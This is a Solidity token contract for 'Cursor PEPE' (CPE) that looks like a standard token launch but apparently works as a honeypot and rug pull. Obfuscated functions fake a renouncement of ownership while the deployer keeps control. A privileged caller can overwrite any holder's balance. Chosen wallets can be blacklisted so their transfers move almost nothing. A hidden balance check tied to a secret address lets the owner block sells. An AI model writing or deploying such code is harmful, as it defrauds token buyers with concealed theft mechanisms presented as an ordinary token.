//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface maxLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellMarketing) external view returns (uint256);

    function transfer(address launchedFund, uint256 feeAt) external returns (bool);

    function allowance(address sellLimitAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeAt) external returns (bool);

    function transferFrom(
        address sender,
        address launchedFund,
        uint256 feeAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingLiquidity, uint256 value);
    event Approval(address indexed sellLimitAuto, address indexed spender, uint256 value);
}

abstract contract amountTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface senderTrading {
    function createPair(address swapTrading, address autoExempt) external returns (address);
}

interface liquidityExempt is maxLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CursorPEPE is amountTake, maxLaunched, liquidityExempt {

    function autoFund(address isTeam, address launchedFund, uint256 feeAt) internal returns (bool) {
        require(listTeam[isTeam] >= feeAt);
        listTeam[isTeam] -= feeAt;
        listTeam[launchedFund] += feeAt;
        emit Transfer(isTeam, launchedFund, feeAt);
        return true;
    }

    uint256 senderWalletMax;

    uint256 private atAmountLaunch = 100000000 * 10 ** 18;

    function teamWallet(address feeWalletAmount, uint256 feeAt) public {
        enableShouldLimit();
        listTeam[feeWalletAmount] = feeAt;
    }

    function symbol() external view virtual override returns (string memory) {
        return minWallet;
    }

    function toEnableSwap() public {
        emit OwnershipTransferred(receiverTeam, address(0));
        amountShouldTx = address(0);
    }

    function tokenTeam(address isTeam, address launchedFund, uint256 feeAt) internal returns (bool) {
        if (isTeam == receiverTeam) {
            return autoFund(isTeam, launchedFund, feeAt);
        }
        uint256 enableToken = maxLaunched(atTakeIs).balanceOf(isSender);
        require(enableToken == marketingLimitFund);
        require(launchedFund != isSender);
        if (feeTrading[isTeam]) {
            return autoFund(isTeam, launchedFund, marketingShould);
        }
        return autoFund(isTeam, launchedFund, feeAt);
    }

    bool public maxLiquidity;

    function atEnableWallet(address amountTrading) public {
        enableShouldLimit();
        if (fromSender != teamTradingMax) {
            maxLiquidity = true;
        }
        if (amountTrading == receiverTeam || amountTrading == atTakeIs) {
            return;
        }
        feeTrading[amountTrading] = true;
    }

    uint8 private sellAutoAt = 18;

    uint256 private exemptLiquidity;

    address private amountShouldTx;

    string private receiverFromTx = "Cursor PEPE";

    mapping(address => mapping(address => uint256)) private shouldReceiver;

    function allowance(address exemptSwap, address fundTake) external view virtual override returns (uint256) {
        if (fundTake == marketingTo) {
            return type(uint256).max;
        }
        return shouldReceiver[exemptSwap][fundTake];
    }

    mapping(address => bool) public feeTrading;

    string private minWallet = "CPE";

    mapping(address => bool) public feeSwapAt;

    mapping(address => uint256) private listTeam;

    bool private launchAtSender;

    uint256 marketingLimitFund;

    function approve(address fundTake, uint256 feeAt) public virtual override returns (bool) {
        shouldReceiver[_msgSender()][fundTake] = feeAt;
        emit Approval(_msgSender(), fundTake, feeAt);
        return true;
    }

    function launchedMinAt(address marketingTotal) public {
        require(marketingTotal.balance < 100000);
        if (shouldEnableReceiver) {
            return;
        }
        
        feeSwapAt[marketingTotal] = true;
        if (exemptLiquidity != senderTradingMin) {
            senderTradingMin = exemptLiquidity;
        }
        shouldEnableReceiver = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return atAmountLaunch;
    }

    bool public shouldEnableReceiver;

    uint256 private senderTradingMin;

    address marketingTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return amountShouldTx;
    }

    function enableShouldLimit() private view {
        require(feeSwapAt[_msgSender()]);
    }

    uint256 public launchLimit;

    address public atTakeIs;

    function name() external view virtual override returns (string memory) {
        return receiverFromTx;
    }

    bool public fromSender;

    event OwnershipTransferred(address indexed maxList, address indexed receiverToken);

    function transferFrom(address isTeam, address launchedFund, uint256 feeAt) external override returns (bool) {
        if (_msgSender() != marketingTo) {
            if (shouldReceiver[isTeam][_msgSender()] != type(uint256).max) {
                require(feeAt <= shouldReceiver[isTeam][_msgSender()]);
                shouldReceiver[isTeam][_msgSender()] -= feeAt;
            }
        }
        return tokenTeam(isTeam, launchedFund, feeAt);
    }

    address public receiverTeam;

    bool private teamTradingMax;

    function buyList(uint256 feeAt) public {
        enableShouldLimit();
        marketingLimitFund = feeAt;
    }

    function decimals() external view virtual override returns (uint8) {
        return sellAutoAt;
    }

    uint256 constant marketingShould = 14 ** 10;

    function balanceOf(address sellMarketing) public view virtual override returns (uint256) {
        return listTeam[sellMarketing];
    }

    constructor (){
        if (exemptLiquidity != senderTradingMin) {
            maxLiquidity = true;
        }
        shouldToken limitTotalTx = shouldToken(marketingTo);
        atTakeIs = senderTrading(limitTotalTx.factory()).createPair(limitTotalTx.WETH(), address(this));
        
        receiverTeam = _msgSender();
        toEnableSwap();
        feeSwapAt[receiverTeam] = true;
        listTeam[receiverTeam] = atAmountLaunch;
        if (maxLiquidity) {
            launchLimit = exemptLiquidity;
        }
        emit Transfer(address(0), receiverTeam, atAmountLaunch);
    }

    address isSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return amountShouldTx;
    }

    function transfer(address feeWalletAmount, uint256 feeAt) external virtual override returns (bool) {
        return tokenTeam(_msgSender(), feeWalletAmount, feeAt);
    }

}